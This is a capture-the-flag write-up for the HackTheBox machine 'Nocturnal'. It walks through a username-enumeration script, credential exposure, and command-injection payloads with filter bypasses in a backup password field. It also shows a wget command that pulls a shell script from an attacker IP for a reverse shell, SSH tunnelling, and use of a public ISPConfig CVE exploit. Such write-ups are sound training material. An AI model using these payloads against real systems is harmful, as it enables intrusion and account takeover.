---
title: Nocturnal
tags:
  - HackTheBox
  - Easy
  - Linux
  - Command-Injection
  - Tunnelling
  - CVE
date: 2025-04-26T00:00:00Z
---
![](Pasted%20image%2020250426112535.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.64 nocturnal.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- nocturnal.htb > sC.txt

[redacted]
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Welcome to Nocturnal
```

So I checked its website:

![](Pasted%20image%2020250426112746.png)

It seems to be a place to upload files, so I created an account and logged in:

![](Pasted%20image%2020250426112957.png)

![](Pasted%20image%2020250426113018.png)

I tried to upload a `.svg` but the following formats are only accepted:

![](Pasted%20image%2020250426113108.png)

I captured the request of uploading a file and noted that there is being made a petition to `/view.php?username=USER&file=FILE`:

![](Pasted%20image%2020250426123617.png)

Now if I try to modify my username and I try a non-existent one I get the message "User not found":

![](Pasted%20image%2020250426123741.png)

But I can guess the admin username and then check a different message, indicating that the file is not existing:

![](Pasted%20image%2020250426123826.png)

## Exploitation

I can try to search for existing users to check their private files. I'll use `/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt`. To do this I'll use the following script:

```python
#!/usr/bin/python3

from pwn import *
import requests, signal, sys

# Variables
wordlist = '/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt'
count = 0
found = []

# Processing input
if len(sys.argv) != 2:
    print("Make user to register and log is a a user to get a session cookie")
    print("Usage: python3 enumusers.py <cookie>")
    sys.exit(1)
else:
    print("NOTE: If \"Usernames found\" is too large or doesn't find any users, you may need to reset the box and try again. \n")
    cookie = sys.argv[1]

# Ctr + c 
def df_handler(sig,frame):
    log.info('\n[!] Exiting... \n')
    sys.exit(1)

signal.signal(signal.SIGINT, df_handler)

# Starting progress bars
prog_enum = log.progress('Enumerating usernames')
prog_found = log.progress('Usernames found')

# Start enumeration
file = open(wordlist, 'r')
while True:
    sleep(0.5)
    count += 1
    username = file.readline()[0:-1]
    enumURL = "http://nocturnal.htb/view.php?username="+username+"&file=pwn.xlsx"
    cookies = {'PHPSESSID':cookie}
    r = requests.get(enumURL, cookies=cookies)
    
    prog_enum.status(username)

    if "File does not exist." in r.text:
        found.append(username)
        prog_found.status(','.join(found))

    if not username:
        break

file.close()    
```

Two users are found: `admin` and `amanda`:

![](Pasted%20image%2020250426125645.png)

So now I can inspect which files has the user `amanda`:

![](Pasted%20image%2020250426181414.png)

There is a file called `privacy.odt`:

![](Pasted%20image%2020250426181508.png)

So now Ill send the petition to the Intercept and then download the file:

![](Pasted%20image%2020250426181632.png)

> So now got new credentials :D `amanda:arHkG7HAI68X8s1J`

![](Pasted%20image%2020250426182109.png)

Now I can try to access the admin panel:

![](Pasted%20image%2020250426182139.png)

It seems to be the website structure. I can see the contents of any file listed:

![](Pasted%20image%2020250426182243.png)

I can also create backups protected with password:

![](Pasted%20image%2020250426182624.png)

So I checked the content of `admin.php` to see the command of the backup creation:

```shell
$command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
```

Notice that we can inject code inside `password` field but there is a function called `cleanEntry` which filters what we input:

![](Pasted%20image%2020250426184543.png)

So we can try sombinations of the following payload:

```shell
;bash -c "id"
# The following one worked
%0abash%09-c%09"id"%0a
```

![](Pasted%20image%2020250426184841.png)

> I got RCE! Now it's time to get a reverse shell. To do that I'll use the following command:

```shell
# First upload a shell (basic one)
%0abash%09-c%09"wget%09http://10.10.14.7:8090/shell.sh%09"%0a

# Then execute it
%0abash%09-c%09"bash%09shell.sh"%0a
```

> Got a reverse shell :D

![](Pasted%20image%2020250426191341.png)

## Pivoting

There is a user called `tobias` inside the machine. I noticed a database called `nocturnal_database.db` inside `/var/www/nocturnal_database`. So I downloaded it and inspected it with SQLite viewer:

![](Pasted%20image%2020250426191827.png)

Found password hashes, so I tried to compare them:

![](Pasted%20image%2020250426191925.png)

> Got ssh credentials: `tobias:slowmotionapocalypse`

### User flag

![](Pasted%20image%2020250426192120.png)

## Privilege Escalation

I performed some enumeration around the machine, and discovered something running on port 8080:

![](Pasted%20image%2020250426192627.png)

So I'll forward port 8080 to my machine:

```shell
ssh -L 8888:127.0.0.1:8080 tobias@nocturnal.htb
```

![](Pasted%20image%2020250426192848.png)

I tested the following credentials: `admin:slowmotionapocalypse`:

![](Pasted%20image%2020250426193445.png)

I searched for "ispconfig cve" and found this [CVE-2023-46818 PoC](https://github.com/ajdumanhug/CVE-2023-46818). So I downloaded the script and executed it:

```shell
python3 cve.py http://127.0.0.1:8888 admin slowmotionapocalypse
```

![](Pasted%20image%2020250426193805.png)

### Root flag

![](Pasted%20image%2020250426193934.png)

==Machine pwned!==